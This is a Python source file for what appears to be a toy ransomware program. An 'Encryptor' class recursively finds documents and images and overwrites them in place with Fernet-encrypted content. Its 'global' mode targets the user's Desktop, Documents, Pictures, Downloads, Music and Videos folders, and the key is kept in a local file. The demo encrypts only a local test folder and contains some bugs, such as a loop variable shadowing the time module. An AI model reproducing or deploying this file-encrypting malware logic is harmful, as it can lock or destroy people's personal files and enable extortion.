from cryptography.fernet import Fernet
import os, sys, time

class Encryptor:
    def __init__(self, encryptScope, verbose=True):
        if os.name != "nt":
            self.VerboseInfo("SHUTDOWN", "Only runs on windows", True)

        self.verbose = verbose
        self.encryptScope = encryptScope # Local (folder ./target_files) / Global (all files)
        self.scriptPath = os.path.dirname(os.path.abspath(__file__))

        if self.encryptScope == "local": 
            self.encryptPaths = [os.path.join(self.scriptPath, "local_target_files")]
        elif self.encryptScope == 'global':
            folder_to_encrypt = ["Desktop", "Downloads", "Music", "Pictures", "Documents", "Videos"]
            self.encryptPaths = [os.path.join(os.path.expanduser("~"), folder) for folder in folder_to_encrypt]

    def KeyGen(self):
        if "decrypt_key.key" in os.listdir(self.scriptPath):
            raise FileExistsError("There's already a decrypt key")  
        key = Fernet.generate_key()

        with open(f"{self.scriptPath}/decrypt_key.key", "wb") as fileContainingKey:
            fileContainingKey.write(key)
        
        return key

    def GetKey(self):
        if "decrypt_key.key" in os.listdir(self.scriptPath):
            with open("decrypt_key.key", "rb") as fileContainingKey:
                return fileContainingKey.read()
        else:
            return 0

    def DelKey(self):
        if "decrypt_key.key" in os.listdir(self.scriptPath):
            os.remove("decrypt_key.key")
            self.key = None
            self.VerboseInfo("INFO", "Decrypt key deleted")

    def GetTargetedFiles(self, paths=None):
        if paths == None: paths = self.encryptPaths
        toEncrypt = ['.txt', '.jpeg', 'jpg', '.bmp', '.pdf', '.docx', '.Odt']
        targetedFiles = []

        for path in paths:
            try:
                for file in os.listdir(path):
                    pathToFile = os.path.join(path, file)

                    if os.path.isfile(pathToFile):
                        if os.path.splitext(file)[1] in toEncrypt:
                            targetedFiles.append(pathToFile)
                    elif os.path.isdir(pathToFile):
                        targetedFiles += self.GetTargetedFiles([pathToFile])
                os.chdir(self.scriptPath)
            except: pass
            
        return targetedFiles

    def FileEncryption(self):
        self.VerboseInfo('ALERT', 'Encryption started')

        self.key = self.KeyGen()
        self.fernetInstance = Fernet(self.key)
    
        filesToEncrypt = self.GetTargetedFiles()

        for file in filesToEncrypt:
            try:
                with open(file, "br") as openedFile:
                    fileContent = openedFile.read()

                with open(file, "bw") as openedFile:
                    openedFile.write(self.fernetInstance.encrypt(fileContent))
                self.VerboseInfo("INFO", f"Crypted file: {file}")
            except:
                self.VerboseInfo("ERROR", f"Could not encrypt the following file: {file}")
        
        self.VerboseInfo('ALERT', 'Encryption finished')

    def FileDecryption(self):
        self.VerboseInfo('ALERT', 'Decryption started')

        self.key = self.GetKey()
        self.fernetInstance = Fernet(self.key)
        filesToDecrypt = self.GetTargetedFiles()

        for file in filesToDecrypt:
            with open(file, "br") as openedFile:
                fileContent = openedFile.read()

            with open(file, "bw") as openedFile:
                try: openedFile.write(self.fernetInstance.decrypt(fileContent))
                except: self.VerboseInfo('ERROR', f"The following file isn't crypted: {file}")
            self.VerboseInfo("INFO", f"Decrypted file: {file}")
        self.DelKey()
        self.VerboseInfo('ALERT', 'Decryption finished')
    
    def VerboseInfo(self, typeOfMessage, message, forceOutput=False):
        if self.verbose or forceOutput:
            print(f"[ {typeOfMessage} ] {message}")

def demo():
    for time in range(2):
        os.system('cls')
        print("=== File Encryption Demo ===")
        print(f"Will encrypt \"local_target_files\" folder in {time+1}sec")
        time.sleep(2)
    
    rsmw = Encryptor("local")
    rsmw.FileEncryption()

    print(f"\n\nDecrypt key: {rsmw.key.decode('utf-8')}")
    user_input = input('Enter decrypt key: ')
    
    while user_input != rsmw.key.decode('utf-8'):
        user_input = input('Enter decrypt key: ')
    rsmw.FileDecryption()
    input('\n\npress ENTER to quit...')

def global_mode():
    print("Will encrypt ~/desktop, ~/download, ~/pics etc...")

if __name__ == "__main__":
    demo()